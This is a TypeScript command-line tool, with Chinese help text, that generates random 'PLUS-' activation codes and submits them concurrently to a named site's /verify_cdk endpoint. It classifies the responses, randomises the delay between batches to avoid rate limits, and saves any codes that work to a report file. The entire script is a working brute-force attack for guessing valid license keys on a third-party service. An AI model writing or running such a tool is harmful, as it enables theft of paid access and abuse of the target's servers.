const CHARSET = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

interface VerifyResult {
  code: string;
  status: "valid" | "invalid" | "error";
  message: string;
  index: number;
}

function randomInt(min: number, max: number): number {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomChar(): string {
  return CHARSET[Math.floor(Math.random() * CHARSET.length)];
}

function randomGroup(): string {
  return Array.from({ length: 4 }, () => randomChar()).join("");
}

function generateCode(): string {
  return `PLUS-${randomGroup()}-${randomGroup()}-${randomGroup()}-${randomGroup()}`;
}

async function verifyCode(
  baseUrl: string,
  code: string,
  index: number
): Promise<VerifyResult> {
  const url = `${baseUrl}/verify_cdk`;
  try {
    const body = new URLSearchParams();
    body.append("cdk", code);

    const resp = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
      body: body.toString(),
      redirect: "manual",
    });

    const text = await resp.text();
    const location = resp.headers.get("location") || "";

    if (resp.status === 302 || resp.status === 301) {
      if (location.includes("success") || location.includes("activate")) {
        return { code, status: "valid", message: `重定向到: ${location}`, index };
      }
      return { code, status: "invalid", message: `重定向到: ${location}`, index };
    }

    if (resp.status === 200) {
      const lower = text.toLowerCase();
      if (
        lower.includes("无效") ||
        lower.includes("invalid") ||
        lower.includes("不存在") ||
        lower.includes("已使用") ||
        lower.includes("过期") ||
        lower.includes("错误")
      ) {
        const match = text.match(/(?:无效|invalid|不存在|已使用|过期|错误)[^<]*/i);
        return {
          code,
          status: "invalid",
          message: match ? match[0].trim() : "无效激活码",
          index,
        };
      }
      return { code, status: "valid", message: "页面返回 200", index };
    }

    if (resp.status === 429) {
      return { code, status: "error", message: "触发限流", index };
    }

    return { code, status: "error", message: `HTTP ${resp.status}`, index };
  } catch (err: any) {
    return { code, status: "error", message: err.message, index };
  }
}

function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  const s = Math.floor(ms / 1000);
  const m = Math.floor(s / 60);
  const h = Math.floor(m / 60);
  if (h > 0) return `${h}h${m % 60}m${s % 60}s`;
  if (m > 0) return `${m}m${s % 60}s`;
  return `${s}s`;
}

async function main() {
  const args = process.argv.slice(2);

  if (args.includes("-h") || args.includes("--help")) {
    console.log(`PLUS 码并发生成 & 验证工具 (Bun.js)

用法: bun run scripts/plus-codegen.ts [选项]

选项:
  -n <数量>     最大尝试次数 (默认 1000, 0=无限)
  -u <域名>     验证站点地址 (默认 https://kt.sunapi.us.ci)
  -c <并发>     并发数 (默认 3)
  -d <毫秒>     最小间隔毫秒 (默认 300)
  -D <毫秒>     最大间隔毫秒 (默认 700)
  --stop        找到有效码后立即停止
  -h, --help    显示帮助`);
    return;
  }

  const maxAttempts = args.includes("-n")
    ? parseInt(args[args.indexOf("-n") + 1]) || 1000
    : 1000;
  const baseUrl = args.includes("-u")
    ? args[args.indexOf("-u") + 1] || "https://kt.sunapi.us.ci"
    : "https://kt.sunapi.us.ci";
  const concurrency = args.includes("-c")
    ? parseInt(args[args.indexOf("-c") + 1]) || 3
    : 3;
  const minDelay = args.includes("-d")
    ? parseInt(args[args.indexOf("-d") + 1]) || 300
    : 300;
  const maxDelay = args.includes("-D")
    ? parseInt(args[args.indexOf("-D") + 1]) || 700
    : 700;
  const stopOnValid = args.includes("--stop");

  const infinite = maxAttempts === 0;
  const totalLabel = infinite ? "∞" : String(maxAttempts);

  console.log(`\n╔══════════════════════════════════════════════════╗`);
  console.log(`║   PLUS 码并发生成 & 验证                         ║`);
  console.log(`╠══════════════════════════════════════════════════╣`);
  console.log(`║   目标:    ${baseUrl.padEnd(38)}║`);
  console.log(`║   数量:    ${totalLabel.padEnd(38)}║`);
  console.log(`║   并发:    ${String(concurrency).padEnd(38)}║`);
  console.log(`║   间隔:    ${minDelay}ms ~ ${maxDelay}ms`.padEnd(52) + "║");
  console.log(`║   停止:    ${(stopOnValid ? "找到有效码即停" : "跑完全部").padEnd(38)}║`);
  console.log(`╚══════════════════════════════════════════════════╝\n`);

  const startTime = Date.now();
  const results: VerifyResult[] = [];
  const validCodes: string[] = [];
  let consecutiveErrors = 0;
  let globalIndex = 0;
  let stopped = false;

  while (!stopped && (infinite || globalIndex < maxAttempts)) {
    const batchSize = Math.min(
      concurrency,
      infinite ? concurrency : maxAttempts - globalIndex
    );

    const codes = Array.from({ length: batchSize }, () => generateCode());
    const batchResults = await Promise.all(
      codes.map((code, i) => verifyCode(baseUrl, code, globalIndex + i + 1))
    );
    globalIndex += batchSize;

    for (const r of batchResults) {
      results.push(r);
      const icon =
        r.status === "valid" ? "✅" : r.status === "invalid" ? "❌" : "⚠️";
      console.log(`[${r.index}/${totalLabel}] ${icon} ${r.code}  →  ${r.message}`);

      if (r.status === "valid") {
        validCodes.push(r.code);
        consecutiveErrors = 0;
        if (stopOnValid) {
          stopped = true;
          console.log(`\n🎉 找到有效码，停止运行！`);
        }
      }

      if (r.status === "error") {
        consecutiveErrors++;
        if (consecutiveErrors >= 10) {
          console.log(`\n⚠️  连续 ${consecutiveErrors} 次错误，服务可能不可用，已自动停止。`);
          stopped = true;
        }
      } else {
        consecutiveErrors = 0;
      }
    }

    if (!stopped && (infinite || globalIndex < maxAttempts)) {
      const delay = randomInt(minDelay, maxDelay);
      await new Promise((r) => setTimeout(r, delay));
    }
  }

  const elapsed = Date.now() - startTime;
  const valid = results.filter((r) => r.status === "valid").length;
  const invalid = results.filter((r) => r.status === "invalid").length;
  const errors = results.filter((r) => r.status === "error").length;
  const rate = (results.length / (elapsed / 1000)).toFixed(1);

  console.log(`\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`);
  console.log(`  运行完成  耗时: ${formatDuration(elapsed)}`);
  console.log(`  总计: ${results.length}  ✅ 有效: ${valid}  ❌ 无效: ${invalid}  ⚠️ 错误: ${errors}`);
  console.log(`  速率: ${rate} 条/秒`);

  if (valid > 0) {
    console.log(`\n  有效码:`);
    results
      .filter((r) => r.status === "valid")
      .forEach((r) => console.log(`    ✅ ${r.code}`));
  }

  const reportFile = `verify-report-${Date.now()}.txt`;
  const report =
    results
      .map((r) => `${r.status.toUpperCase()}\t${r.code}\t${r.message}\t#${r.index}`)
      .join("\n") + "\n";
  await Bun.write(reportFile, report);
  console.log(`\n  验证报告: ${reportFile}`);
  console.log(`━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n`);
}

main();
